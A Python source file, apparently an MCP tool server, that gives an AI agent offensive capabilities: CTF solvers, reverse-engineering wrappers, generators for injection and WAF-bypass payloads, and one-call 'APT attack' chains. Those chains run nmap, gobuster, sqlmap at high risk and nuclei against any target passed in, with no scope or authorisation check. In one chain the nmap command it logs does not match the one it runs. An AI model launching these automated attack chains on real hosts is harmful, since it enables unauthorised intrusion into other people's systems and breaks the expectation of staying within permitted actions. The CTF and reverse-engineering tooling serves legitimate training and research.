    def ctf_misc_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """Misc类CTF题目求解器"""
        solver_steps = []

        # 第一阶段：文件分析
        step1 = {
            "phase": "file_analysis",
            "description": "文件格式分析和隐写检测",
            "actions": [
                {"action": "file_type_detection", "tool": "execute_command", "params": {"command": "file"}},
                {"action": "steganography_detection", "tool": "execute_command", "params": {"command": "steghide"}},
                {"action": "metadata_extraction", "tool": "execute_command", "params": {"command": "exiftool"}}
            ]
        }
        solver_steps.append(step1)

        # 第二阶段：数据恢复
        step2 = {
            "phase": "data_recovery",
            "description": "数据恢复和隐藏信息提取",
            "actions": [
                {"action": "deleted_files", "tool": "execute_command", "params": {"command": "photorec"}},
                {"action": "memory_analysis", "tool": "execute_command", "params": {"command": "volatility"}},
                {"action": "network_analysis", "tool": "tshark_capture", "params": {"interface": "any"}}
            ]
        }
        solver_steps.append(step2)

        return {
            "success": True,
            "solver_type": "ctf_misc",
            "target": target,
            "time_limit": time_limit,
            "challenge_category": "misc",
            "total_phases": len(solver_steps),
            "solver_steps": solver_steps,
            "auto_flag_detection": True,
            "message": f"CTF Misc题目求解器已启动，目标: {target}"
        }

    @mcp.tool()
    def ctf_auto_detect_solver(target: str, challenge_info: Dict, time_limit: str) -> Dict[str, Any]:
        """CTF题目自动检测求解器"""
        # 首先进行目标分析
        analysis_result = analyze_target_intelligence(target)

        # 基于分析结果决定求解策略
        if "web" in analysis_result.get("target_type", ""):
            return ctf_web_comprehensive_solver(target, challenge_info, time_limit)
        elif analysis_result.get("analysis_summary", {}).get("ssh_available"):
            return ctf_pwn_solver(target, challenge_info, time_limit)
        else:
            # 默认综合求解策略
            return {
                "success": True,
                "solver_type": "ctf_auto_detect",
                "target": target,
                "detected_type": analysis_result.get("target_type", "unknown"),
                "recommended_approach": "manual_analysis",
                "analysis_result": analysis_result,
                "message": f"CTF题目自动检测完成，建议采用手动分析方法"
            }

    # ==================== IDA 逆向工程工具 ====================

    @mcp.tool()
    def reverse_tool_check() -> Dict[str, Any]:
        """
        检查可用的逆向分析工具 - 检测本机逆向工程工具

        Returns:
            可用的逆向分析工具状态
        """
        available_tools = {}

        # 检查Radare2
        try:
            import subprocess
            result = subprocess.run(["r2", "-version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                available_tools["radare2"] = {
                    "available": True,
                    "version": result.stdout.strip()
                }
            else:
                available_tools["radare2"] = {"available": False}
        except:
            available_tools["radare2"] = {"available": False}

        # 检查Ghidra
        try:
            import os
            ghidra_paths = [
                "C:\\ghidra\\support\\analyzeHeadless.bat",
                "C:\\Program Files\\ghidra\\support\\analyzeHeadless.bat",
                "/usr/bin/ghidra",
                "/opt/ghidra/support/analyzeHeadless"
            ]
            ghidra_available = any(os.path.exists(path) for path in ghidra_paths)
            available_tools["ghidra"] = {"available": ghidra_available}
        except:
            available_tools["ghidra"] = {"available": False}

        # 检查Cutter (Radare2 GUI)
        try:
            import subprocess
            result = subprocess.run(["cutter", "--version"], capture_output=True, text=True, timeout=5)
            available_tools["cutter"] = {
                "available": result.returncode == 0,
                "version": result.stdout.strip() if result.returncode == 0 else None
            }
        except:
            available_tools["cutter"] = {"available": False}

        return {
            "success": True,
            "available_tools": available_tools,
            "recommendation": "radare2" if available_tools["radare2"]["available"]
                           else "ghidra" if available_tools["ghidra"]["available"]
                           else "请安装逆向分析工具"
        }


    @mcp.tool()
    def radare2_analyze_binary(binary_path: str) -> Dict[str, Any]:
        """
        使用Radare2分析二进制文件 - 开源逆向分析工具

        Args:
            binary_path: 二进制文件路径

        Returns:
            Radare2分析结果，包含函数、字符串、导入导出等信息
        """
        try:
            import subprocess
            import json

            results = {
                "binary_path": binary_path,
                "analysis_steps": {},
                "functions": [],
                "strings": [],
                "imports": [],
                "symbols": []
            }

            # 基础信息分析
            info_cmd = ["r2", "-q", "-c", "ij", binary_path]
            info_result = subprocess.run(info_cmd, capture_output=True, text=True, timeout=30)
            if info_result.returncode == 0:
                try:
                    info_data = json.loads(info_result.stdout)
                    results["binary_info"] = info_data
                except:
                    results["binary_info"] = {"raw_output": info_result.stdout}

            # 自动分析
            analyze_cmd = ["r2", "-q", "-A", "-c", "aflj", binary_path]
            func_result = subprocess.run(analyze_cmd, capture_output=True, text=True, timeout=60)
            if func_result.returncode == 0:
                try:
                    func_data = json.loads(func_result.stdout)
                    results["functions"] = func_data
                except:
                    results["functions"] = []

            # 字符串提取
            strings_cmd = ["r2", "-q", "-c", "izj", binary_path]
            str_result = subprocess.run(strings_cmd, capture_output=True, text=True, timeout=30)
            if str_result.returncode == 0:
                try:
                    str_data = json.loads(str_result.stdout)
                    results["strings"] = str_data
                except:
                    results["strings"] = []

            # 导入函数
            imports_cmd = ["r2", "-q", "-c", "iij", binary_path]
            imp_result = subprocess.run(imports_cmd, capture_output=True, text=True, timeout=30)
            if imp_result.returncode == 0:
                try:
                    imp_data = json.loads(imp_result.stdout)
                    results["imports"] = imp_data
                except:
                    results["imports"] = []

            results["success"] = True
            results["tool"] = "radare2"
            return results

        except Exception as e:
            return {
                "success": False,
                "error": f"Radare2分析失败: {str(e)}",
                "suggestion": "请确保已安装Radare2: https://rada.re/"
            }

    @mcp.tool()
    def ghidra_analyze_binary(binary_path: str) -> Dict[str, Any]:
        """
        使用Ghidra分析二进制文件 - NSA开源逆向分析工具

        Args:
            binary_path: 二进制文件路径

        Returns:
            Ghidra分析结果
        """
        try:
            import subprocess
            import tempfile
            import os

            # 创建临时项目目录
            with tempfile.TemporaryDirectory() as temp_dir:
                project_dir = os.path.join(temp_dir, "ghidra_project")

                # Ghidra无头分析命令
                ghidra_paths = [
                    "C:\\ghidra\\support\\analyzeHeadless.bat",
                    "/opt/ghidra/support/analyzeHeadless"
                ]

                ghidra_cmd = None
                for path in ghidra_paths:
                    if os.path.exists(path):
                        ghidra_cmd = path
                        break

                if not ghidra_cmd:
                    return {
                        "success": False,
                        "error": "Ghidra未找到",
                        "suggestion": "请安装Ghidra: https://ghidra-sre.org/"
                    }

                # 执行Ghidra分析
                cmd = [
                    ghidra_cmd,
                    project_dir,
                    "temp_project",
                    "-import", binary_path,
                    "-postScript", "ListFunctionsScript.java"
                ]

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

                return {
                    "success": result.returncode == 0,
                    "tool": "ghidra",
                    "binary_path": binary_path,
                    "output": result.stdout,
                    "error": result.stderr if result.returncode != 0 else None
                }

        except Exception as e:
            return {
                "success": False,
                "error": f"Ghidra分析失败: {str(e)}"
            }

    @mcp.tool()
    def auto_reverse_analyze(binary_path: str) -> Dict[str, Any]:
        """
        自动选择可用工具进行逆向分析 - 智能工具选择

        Args:
            binary_path: 二进制文件路径

        Returns:
            自动分析结果，使用最佳可用工具
        """
        # 检查可用工具
        tool_status = reverse_tool_check()
        available = tool_status.get("available_tools", {})

        results = {
            "binary_path": binary_path,
            "attempted_tools": [],
            "successful_analysis": None,
            "all_results": {}
        }

        # 优先级：Radare2 > Ghidra (移除IDA Pro)
        if available.get("radare2", {}).get("available"):
            try:
                r2_result = radare2_analyze_binary(binary_path)
                results["attempted_tools"].append("radare2")
                results["all_results"]["radare2"] = r2_result
                if r2_result.get("success"):
                    results["successful_analysis"] = "radare2"
                    results["primary_result"] = r2_result
                    return results
            except:
                pass

        if available.get("ghidra", {}).get("available"):
            try:
                ghidra_result = ghidra_analyze_binary(binary_path)
                results["attempted_tools"].append("ghidra")
                results["all_results"]["ghidra"] = ghidra_result
                if ghidra_result.get("success"):
                    results["successful_analysis"] = "ghidra"
                    results["primary_result"] = ghidra_result
                    return results
            except:
                pass

        # 如果所有工具都失败
        results["success"] = False
        results["error"] = "所有逆向分析工具都不可用或分析失败"
        results["suggestion"] = "请安装以下工具之一：IDA Pro, Radare2, Ghidra"
        return results

    @mcp.tool()
    def ctf_reverse_solver(binary_path: str, challenge_hints: List[str] = None) -> Dict[str, Any]:
        """
        CTF逆向题目自动求解器 - 综合使用多种逆向分析技术

        Args:
            binary_path: 题目二进制文件路径
            challenge_hints: 题目提示信息列表（可选）

        Returns:
            逆向分析结果和可能的Flag
        """
        if not challenge_hints:
            challenge_hints = []

        results = {
            "binary_path": binary_path,
            "challenge_hints": challenge_hints,
            "analysis_steps": {},
            "findings": [],
            "potential_flags": []
        }

        try:
            # 步骤1：检查IDA服务器
            logger.info("步骤1：检查IDA服务器状态")
            ida_status = ida_check_server()
            results["analysis_steps"]["1_ida_server_check"] = ida_status

            if not ida_status.get("ida_available", False):
                return {
                    "success": False,
                    "error": "IDA服务器不可用，请先启动IDA Pro并加载MCP插件",
                    "results": results
                }

            # 步骤2：全面二进制分析
            logger.info("步骤2：执行全面二进制分析")
            binary_analysis = ida_analyze_binary(binary_path)
            results["analysis_steps"]["2_binary_analysis"] = binary_analysis

            # 步骤3：加密模式检测
            logger.info("步骤3：搜索加密算法模式")
            crypto_patterns = ida_find_crypto_patterns()
            results["analysis_steps"]["3_crypto_detection"] = crypto_patterns

            # 步骤4：字符串分析
            logger.info("步骤4：提取和分析字符串")
            strings_analysis = ida_extract_strings_with_xrefs()
            results["analysis_steps"]["4_strings_analysis"] = strings_analysis

            # 分析结果，查找可能的Flag
            if strings_analysis.get("success"):
                strings_data = strings_analysis.get("strings_analysis", {}).get("strings", [])
                for string_info in strings_data:
                    string_value = string_info.get("value", "")
                    # 检查常见的CTF Flag格式
                    if any(pattern in string_value.lower() for pattern in ["flag{", "ctf{", "picoctf{", "hackthebox}"]):
                        results["potential_flags"].append({
                            "flag": string_value,
                            "address": string_info.get("address"),
                            "source": "string_analysis"
                        })

            # 步骤5：智能分析
            logger.info("步骤5：执行智能逆向分析")

            # 生成针对性分析脚本
            analysis_script = '''
import idautils
import idc
import idaapi

def smart_ctf_analysis():
    findings = []

    # 查找main函数
    main_func = ida_name.get_name_ea(idaapi.BADADDR, "main")
    if main_func != idaapi.BADADDR:
        findings.append({"type": "main_function", "address": hex(main_func)})

    # 查找可疑的系统调用
    suspicious_calls = ["system", "execve", "popen", "printf", "scanf", "gets", "strcmp"]
    for call in suspicious_calls:
        addr = ida_name.get_name_ea(idaapi.BADADDR, call)
        if addr != idaapi.BADADDR:
            findings.append({"type": "suspicious_call", "function": call, "address": hex(addr)})

    # 查找可疑的字符串比较
    for func_ea in idautils.Functions():
        func_name = ida_funcs.get_func_name(func_ea)
        if "check" in func_name.lower() or "verify" in func_name.lower() or "validate" in func_name.lower():
            findings.append({"type": "validation_function", "name": func_name, "address": hex(func_ea)})

    return findings

smart_ctf_analysis()
'''

            smart_analysis = ida_execute_custom_script(analysis_script)
            results["analysis_steps"]["5_smart_analysis"] = smart_analysis

            results["success"] = True
            results["summary"] = {
                "total_functions": len(binary_analysis.get("analysis", {}).get("functions", [])),
                "total_strings": len(strings_data) if 'strings_data' in locals() else 0,
                "crypto_patterns_found": len(crypto_patterns.get("crypto_analysis", {}).get("crypto_patterns", [])),
                "potential_flags_found": len(results["potential_flags"])
            }

            return results

        except Exception as e:
            logger.error(f"CTF逆向求解器错误: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    @mcp.tool()
    def ctf_crypto_reverser(binary_path: str, encrypted_data: str = "") -> Dict[str, Any]:
        """
        CTF密码学逆向专用工具 - 专门解决密码学相关的逆向题目

        Args:
            binary_path: 包含加密算法的二进制文件
            encrypted_data: 加密的数据（可选）

        Returns:
            密码学逆向分析结果，包含算法识别和解密尝试
        """
        results = {
            "binary_path": binary_path,
            "encrypted_data": encrypted_data,
            "crypto_findings": [],
            "decryption_attempts": [],
            "algorithm_analysis": {}
        }

        try:
            # 检查IDA服务器
            if not ida_check_server().get("ida_available", False):
                return {"success": False, "error": "IDA服务器不可用"}

            # 执行密码学模式搜索
            crypto_analysis = ida_find_crypto_patterns()
            results["algorithm_analysis"] = crypto_analysis

            # 执行专门的密码学逆向脚本
            crypto_reverse_script = '''
import idautils
import idc
import idaapi
import ida_bytes

def advanced_crypto_analysis():
    findings = []

    # 搜索XOR操作
    for func_ea in idautils.Functions():
        func = idaapi.get_func(func_ea)
        if not func:
            continue

        ea = func.start_ea
        while ea < func.end_ea:
            if idc.print_insn_mnem(ea) == "xor":
                findings.append({
                    "type": "xor_operation",
                    "address": hex(ea),
                    "function": ida_funcs.get_func_name(func_ea),
                    "instruction": idc.GetDisasm(ea)
                })
            ea = idc.next_head(ea)

    # 搜索位操作和移位
    shift_ops = ["shl", "shr", "rol", "ror"]
    for func_ea in idautils.Functions():
        func = idaapi.get_func(func_ea)
        if not func:
            continue

        ea = func.start_ea
        while ea < func.end_ea:
            mnem = idc.print_insn_mnem(ea)
            if mnem in shift_ops:
                findings.append({
                    "type": "bit_operation",
                    "operation": mnem,
                    "address": hex(ea),
                    "function": ida_funcs.get_func_name(func_ea)
                })
            ea = idc.next_head(ea)

    # 查找循环结构（可能的加密循环）
    for func_ea in idautils.Functions():
        func_name = ida_funcs.get_func_name(func_ea)
        if any(word in func_name.lower() for word in ["encrypt", "decrypt", "cipher", "hash"]):
            findings.append({
                "type": "crypto_function",
                "name": func_name,
                "address": hex(func_ea)
            })

    return findings

advanced_crypto_analysis()
'''

            crypto_script_result = ida_execute_custom_script(crypto_reverse_script)
            results["crypto_findings"] = crypto_script_result

            results["success"] = True
            return results

        except Exception as e:
            logger.error(f"密码学逆向分析错误: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    # ==================== 智能Payload生成器工具 ====================

    @mcp.tool()
    def generate_intelligent_payload(vulnerability_type: str, target_info: Dict = None,
                                   evasion_level: str = "medium", quantity: int = 5) -> Dict[str, Any]:
        """
        智能生成针对特定漏洞的Payload - AI驱动的Payload自动生成和变异。

        Args:
            vulnerability_type: 漏洞类型 (sql_injection, xss, command_injection, lfi, rce, xxe, deserialization)
            target_info: 目标信息 (platform, operating_system, application, waf_type等)
            evasion_level: 规避级别 (low, medium, high)
            quantity: 生成数量 (1-20)

        Returns:
            智能生成的Payload列表，包含编码、混淆和成功率估算
        """
        data = {
            "vulnerability_type": vulnerability_type,
            "target_info": target_info or {},
            "evasion_level": evasion_level,
            "quantity": quantity
        }
        return executor.execute_tool_with_data("intelligent_payload", data)

    @mcp.tool()
    def generate_waf_bypass_payload(vulnerability_type: str, waf_type: str = "unknown",
                                  original_payload: str = "") -> Dict[str, Any]:
        """
        生成WAF绕过Payload - 专门针对Web应用防火墙的绕过技术。

        Args:
            vulnerability_type: 漏洞类型
            waf_type: WAF类型 (cloudflare, akamai, imperva, unknown)
            original_payload: 原始Payload（可选）

        Returns:
            WAF绕过Payload列表，包含多种编码和规避技术
        """
        data = {
            "vulnerability_type": vulnerability_type,
            "waf_type": waf_type,
            "original_payload": original_payload
        }
        return executor.execute_tool_with_data("waf_bypass_payload", data)

    @mcp.tool()
    def generate_polyglot_payload(target_contexts: List[str], target_info: Dict = None) -> Dict[str, Any]:
        """
        生成多语言通用Payload - 在多个上下文环境中都能执行的Payload。

        Args:
            target_contexts: 目标上下文列表 (html, javascript, url, sql等)
            target_info: 目标环境信息

        Returns:
            多语言通用Payload，可在多种环境中执行
        """
        data = {
            "target_contexts": target_contexts,
            "target_info": target_info or {}
        }
        return executor.execute_tool_with_data("polyglot_payload", data)

    @mcp.tool()
    def get_payload_templates() -> Dict[str, Any]:
        """
        获取可用的Payload模板库 - 查看所有支持的漏洞类型和模板。

        Returns:
            完整的Payload模板库信息，包含支持的漏洞类型和平台
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def update_payload_feedback(payload_info: Dict, success: bool) -> Dict[str, Any]:
        """
        更新Payload成功率反馈 - 帮助系统学习和优化Payload生成。

        Args:
            payload_info: Payload信息 (vulnerability_type, target_platform等)
            success: 是否成功执行

        Returns:
            反馈更新结果
        """
        data = {
            "payload_info": payload_info,
            "success": success
        }
        return executor.execute_tool_with_data("payload_feedback", data)

    @mcp.tool()
    def intelligent_sql_injection_payloads(target_url: str, database_type: str = "unknown",
                                         waf_detected: bool = False) -> Dict[str, Any]:
        """
        智能SQL注入Payload生成器 - 针对SQL注入的专门化Payload生成。

        Args:
            target_url: 目标URL
            database_type: 数据库类型 (mysql, postgresql, mssql, oracle, sqlite)
            waf_detected: 是否检测到WAF

        Returns:
            针对性的SQL注入Payload列表
        """
        target_info = {
            "platform": database_type,
            "application": "database",
            "waf_detected": waf_detected,
            "url": target_url
        }

        evasion_level = "high" if waf_detected else "medium"

        return generate_intelligent_payload("sql_injection", target_info, evasion_level, 10)

    @mcp.tool()
    def intelligent_xss_payloads(target_url: str, browser_type: str = "chrome",
                               content_type: str = "html") -> Dict[str, Any]:
        """
        智能XSS Payload生成器 - 针对跨站脚本的专门化Payload生成。

        Args:
            target_url: 目标URL
            browser_type: 浏览器类型 (chrome, firefox, safari, ie)
            content_type: 内容类型 (html, json, xml)

        Returns:
            针对性的XSS Payload列表
        """
        target_info = {
            "platform": browser_type,
            "application": "web",
            "content_type": content_type,
            "url": target_url
        }

        return generate_intelligent_payload("xss", target_info, "medium", 8)

    @mcp.tool()
    def intelligent_command_injection_payloads(target_url: str, os_type: str = "linux",
                                             blind_injection: bool = False) -> Dict[str, Any]:
        """
        智能命令注入Payload生成器 - 针对命令注入的专门化Payload生成。

        Args:
            target_url: 目标URL
            os_type: 操作系统类型 (linux, windows, macos)
            blind_injection: 是否为盲注

        Returns:
            针对性的命令注入Payload列表
        """
        target_info = {
            "platform": os_type,
            "operating_system": os_type,
            "injection_type": "blind" if blind_injection else "direct",
            "url": target_url
        }

        return generate_intelligent_payload("command_injection", target_info, "medium", 8)

    @mcp.tool()
    def ctf_payload_solver(challenge_url: str, challenge_type: str = "unknown",
                         hints: List[str] = None) -> Dict[str, Any]:
        """
        CTF Payload求解器 - 专门针对CTF竞赛的Payload生成和测试。

        Args:
            challenge_url: CTF题目URL
            challenge_type: 题目类型 (web, pwn, misc)
            hints: 题目提示列表

        Returns:
            CTF专用Payload解决方案
        """
        if not hints:
            hints = []

        # 分析题目类型和提示，生成对应的Payload策略
        payload_strategies = []

        if challenge_type == "web" or any("web" in hint.lower() for hint in hints):
            # Web类题目，生成常见Web漏洞Payload
            strategies = [
                {"type": "sql_injection", "priority": "high"},
                {"type": "xss", "priority": "medium"},
                {"type": "lfi", "priority": "medium"},
                {"type": "command_injection", "priority": "high"}
            ]
            payload_strategies.extend(strategies)

        elif challenge_type == "pwn" or any("pwn" in hint.lower() for hint in hints):
            # Pwn类题目，生成二进制漏洞利用Payload
            strategies = [
                {"type": "rce", "priority": "high"},
                {"type": "command_injection", "priority": "high"},
                {"type": "deserialization", "priority": "medium"}
            ]
            payload_strategies.extend(strategies)

        else:
            # 通用策略，尝试所有可能的漏洞类型
            strategies = [
                {"type": "sql_injection", "priority": "medium"},
                {"type": "xss", "priority": "medium"},
                {"type": "command_injection", "priority": "medium"},
                {"type": "lfi", "priority": "low"}
            ]
            payload_strategies.extend(strategies)

        # 为每种策略生成Payload
        ctf_payloads = {}
        for strategy in payload_strategies:
            vuln_type = strategy["type"]
            target_info = {
                "platform": "ctf",
                "application": "ctf_challenge",
                "challenge_type": challenge_type,
                "hints": hints
            }

            payload_result = generate_intelligent_payload(vuln_type, target_info, "high", 5)
            ctf_payloads[vuln_type] = payload_result

        return {
            "success": True,
            "challenge_url": challenge_url,
            "challenge_type": challenge_type,
            "hints": hints,
            "payload_strategies": payload_strategies,
            "generated_payloads": ctf_payloads,
            "message": f"CTF Payload求解器已生成 {len(payload_strategies)} 种攻击策略"
        }

    # ==================== PoC生成和攻击日志MCP工具 ====================

    @mcp.tool()
    def start_attack_session(target: str, mode: str = "apt", session_name: str = "") -> Dict[str, Any]:
        """
        开始新的攻击会话 - 启动自动日志记录和PoC生成。

        Args:
            target: 目标IP地址、域名或URL
            mode: 攻击模式 ("apt" 或 "ctf")
            session_name: 自定义会话名称（可选）

        Returns:
            会话启动结果，包含会话ID和配置信息
        """
        data = {
            "target": target,
            "mode": mode,
            "session_name": session_name
        }
        return executor.execute_tool_with_data("attack_session", data)

    @mcp.tool()
    def log_attack_step(tool_name: str, command: str, success: bool, output: str,
                       parameters: Dict[str, Any] = None, error: str = "", payload: str = "") -> Dict[str, Any]:
        """
        记录攻击步骤 - 实时记录每个工具的执行结果。

        Args:
            tool_name: 使用的工具名称
            command: 执行的命令
            success: 是否执行成功
            output: 工具输出结果
            parameters: 工具参数（可选）
            error: 错误信息（可选）
            payload: 使用的Payload（可选）

        Returns:
            步骤记录结果，包含发现的漏洞和Flag信息
        """
        data = {
            "tool_name": tool_name,
            "command": command,
            "success": success,
            "output": output,
            "parameters": parameters or {},
            "error": error,
            "payload": payload
        }
        return executor.execute_tool_with_data("log_step", data)

    @mcp.tool()
    def end_attack_session() -> Dict[str, Any]:
        """
        结束当前攻击会话 - 完成日志记录并保存会话数据。

        Returns:
            会话结束结果，包含完整的攻击统计信息
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def generate_poc_from_session(session_id: str) -> Dict[str, Any]:
        """
        从指定攻击会话生成PoC - 自动分析攻击链并生成多种格式的PoC。

        Args:
            session_id: 攻击会话ID

        Returns:
            生成的PoC结果，包含Python、Bash、CTF解题脚本和Markdown报告
        """
        data = {"session_id": session_id}
        return executor.execute_tool_with_data("generate_poc", data)

    @mcp.tool()
    def generate_poc_from_current_session() -> Dict[str, Any]:
        """
        从当前活跃会话生成PoC - 无需指定会话ID，直接从当前会话生成。

        Returns:
            生成的PoC结果，自动保存到文件
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def get_attack_session_details(session_id: str) -> Dict[str, Any]:
        """
        获取攻击会话详情 - 查看指定会话的完整攻击历史。

        Args:
            session_id: 攻击会话ID

        Returns:
            详细的会话信息，包含所有攻击步骤和结果
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def list_attack_sessions() -> Dict[str, Any]:
        """
        获取所有攻击会话列表 - 查看历史和当前的所有攻击会话。

        Returns:
            所有攻击会话的摘要信息
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def list_poc_templates() -> Dict[str, Any]:
        """
        获取可用的PoC模板 - 查看系统支持的所有PoC生成模板。

        Returns:
            可用的PoC模板列表和描述信息
        """
        return {"success": False, "error": "本地执行模式，无需API调用"}

    @mcp.tool()
    def auto_apt_attack_with_poc(target: str, session_name: str = "") -> Dict[str, Any]:
        """
        自动APT攻击并生成PoC - 完整的APT攻击链，自动记录和生成PoC。

        这个工具将：
        1. 启动APT模式攻击会话
        2. 执行全面的APT攻击链
        3. 自动记录所有攻击步骤
        4. 在攻击完成后生成PoC

        Args:
            target: 目标IP地址或域名
            session_name: 自定义会话名称（可选）

        Returns:
            完整的APT攻击结果和生成的PoC信息
        """
        # 1. 启动攻击会话
        session_result = start_attack_session(target, "apt", session_name or f"APT_Attack_{target}")

        if not session_result.get("success"):
            return {"error": "Failed to start attack session", "details": session_result}

        session_id = session_result.get("session_id")

        # 2. 执行APT攻击链
        try:
            # 阶段1：侦察
            nmap_result = nmap_scan(target, "-sS", "80,443,22", "-T5 --open --min-rate 5000 --max-retries 1")
            log_attack_step("nmap", f"nmap -sV -sC -p1-1000 -T4 {target}",
                          nmap_result.get("success", False), str(nmap_result))

            # 阶段2：Web应用攻击（如果发现Web服务）
            if "80" in str(nmap_result) or "443" in str(nmap_result):
                target_url = f"http://{target}"

                # 目录扫描
                gobuster_result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/common.txt")
                log_attack_step("gobuster", f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/common.txt",
                              gobuster_result.get("success", False), str(gobuster_result))

                # SQL注入测试
                sqlmap_result = sqlmap_scan(target_url, "", "--batch --level=2")
                log_attack_step("sqlmap", f"sqlmap -u {target_url} --batch --level=2",
                              sqlmap_result.get("success", False), str(sqlmap_result))

                # Web漏洞扫描
                nuclei_result = nuclei_web_scan(target_url, "comprehensive")
                log_attack_step("nuclei", f"nuclei -u {target_url} -t http/",
                              nuclei_result.get("success", False), str(nuclei_result))

            # 3. 结束攻击会话
            end_result = end_attack_session()

            # 4. 生成PoC
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "attack_completed": True,
                "session_summary": end_result,
                "poc_generated": poc_result,
                "message": f"APT攻击链已完成，PoC已生成并保存"
            }

        except Exception as e:
            # 即使攻击过程中出错，也尝试生成PoC
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_poc": poc_result,
                    "message": "攻击过程中出现错误，但已生成部分PoC"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "攻击失败，无法生成PoC"
                }

    @mcp.tool()
    def auto_ctf_solve_with_poc(target: str, challenge_name: str = "", challenge_category: str = "web") -> Dict[str, Any]:
        """
        自动CTF解题并生成PoC - 完整的CTF解题流程，自动记录和生成解题脚本。

        这个工具将：
        1. 启动CTF模式攻击会话
        2. 执行针对性的CTF解题攻击
        3. 自动提取Flag
        4. 生成CTF解题脚本

        Args:
            target: CTF题目地址或IP
            challenge_name: 题目名称（可选）
            challenge_category: 题目分类 (web, pwn, crypto, misc)

        Returns:
            CTF解题结果和生成的解题脚本
        """
        # 1. 启动CTF会话
        session_name = challenge_name or f"CTF_{challenge_category}_{target}"
        session_result = start_attack_session(target, "ctf", session_name)

        if not session_result.get("success"):
            return {"error": "Failed to start CTF session", "details": session_result}

        session_id = session_result.get("session_id")

        try:
            # 2. 执行CTF解题策略
            if challenge_category == "web":
                # Web题目解题流程

                # 快速端口扫描
                nmap_result = nmap_scan(target, "-sV", "80,443,8080,8000,3000", "-T4")
                log_attack_step("nmap", f"nmap -sV -p80,443,8080,8000,3000 {target}",
                              nmap_result.get("success", False), str(nmap_result))

                target_url = f"http://{target}" if not target.startswith("http") else target

                # 目录暴力破解
                gobuster_result = gobuster_scan(target_url, "dir", "/usr/share/wordlists/dirb/big.txt", "-x php,txt,html,js")
                log_attack_step("gobuster", f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js",
                              gobuster_result.get("success", False), str(gobuster_result))

                # SQL注入快速测试
                sqlmap_result = sqlmap_scan(target_url, "", "--batch --level=3 --risk=3")
                log_attack_step("sqlmap", f"sqlmap -u {target_url} --batch --level=3 --risk=3",
                              sqlmap_result.get("success", False), str(sqlmap_result))

                # Web漏洞扫描
                nuclei_result = nuclei_web_scan(target_url, "comprehensive")
                log_attack_step("nuclei", f"nuclei -u {target_url} -t web-vulnerabilities/",
                              nuclei_result.get("success", False), str(nuclei_result))

            elif challenge_category == "pwn":
                # Pwn题目解题流程
                nmap_result = nmap_scan(target, "-sV -sC", "", "-T4")
                log_attack_step("nmap", f"nmap -sV -sC {target}",
                              nmap_result.get("success", False), str(nmap_result))

            else:
                # 通用解题流程
                nmap_result = nmap_scan(target, "-sV", "", "-T4")
                log_attack_step("nmap", f"nmap -sV {target}",
                              nmap_result.get("success", False), str(nmap_result))

            # 3. 结束CTF会话
            end_result = end_attack_session()

            # 4. 生成CTF解题脚本
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "challenge_category": challenge_category,
                "flags_found": end_result.get("flags_found", 0),
                "ctf_completed": True,
                "session_summary": end_result,
                "solver_script": poc_result,
                "message": f"CTF {challenge_category} 题目解题完成，解题脚本已生成"
            }

        except Exception as e:
            # 即使解题过程中出错，也尝试生成脚本
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "partial_script": poc_result,
                    "message": "CTF解题过程中出现错误，但已生成部分解题脚本"
                }
            except:
                return {
                    "success": False,
                    "error": str(e),
                    "session_id": session_id,
                    "message": "CTF解题失败，无法生成解题脚本"
                }

    @mcp.tool()
    def intelligent_attack_with_poc(target: str, mode: str = "apt", objectives: List[str] = None) -> Dict[str, Any]:
        """
        智能化攻击并自动生成PoC - 最高级别的自动化渗透测试。

        结合了：
        - 参数优化
        - 结果关联分析
        - 自适应攻击策略
        - 智能Payload生成
        - 自动PoC生成

        Args:
            target: 目标IP地址、域名或URL
            mode: 攻击模式 ("apt" 或 "ctf")
            objectives: 攻击目标列表（可选）

        Returns:
            完整的智能化攻击结果和多格式PoC
        """
        # 1. 启动智能攻击会话
        session_result = start_attack_session(target, mode, f"Intelligent_{mode.upper()}_{target}")

        if not session_result.get("success"):
            return {"error": "Failed to start intelligent attack session", "details": session_result}

        session_id = session_result.get("session_id")

        try:
            # 2. 执行智能化攻击流程
            results = {}

            # 智能参数优化扫描
            if mode == "apt":
                # APT模式：全面渗透测试
                results["vulnerability_assessment"] = intelligent_vulnerability_assessment(target, "comprehensive")
                results["penetration_test"] = intelligent_penetration_testing(target, "single", "owasp")
            else:
                # CTF模式：快速解题
                results["ctf_solver"] = intelligent_ctf_solver(target, "unknown", "30min")

            # 记录智能攻击结果
            for phase, result in results.items():
                log_attack_step("intelligent_system", f"{phase} on {target}",
                              result.get("success", False), str(result))

            # 3. 结束智能攻击会话
            end_result = end_attack_session()

            # 4. 生成高级PoC
            poc_result = generate_poc_from_session(session_id)

            return {
                "success": True,
                "session_id": session_id,
                "target": target,
                "mode": mode,
                "intelligent_results": results,
                "session_summary": end_result,
                "advanced_poc": poc_result,
                "total_vulnerabilities": end_result.get("vulnerabilities_found", 0),
                "flags_found": end_result.get("flags_found", 0),
                "compromise_level": end_result.get("compromise_level", "none"),
                "message": f"智能化{mode.upper()}攻击完成，高级PoC已生成"
            }

        except Exception as e:
            try:
                end_attack_session()
                poc_result = generate_poc_from_session(session_id)
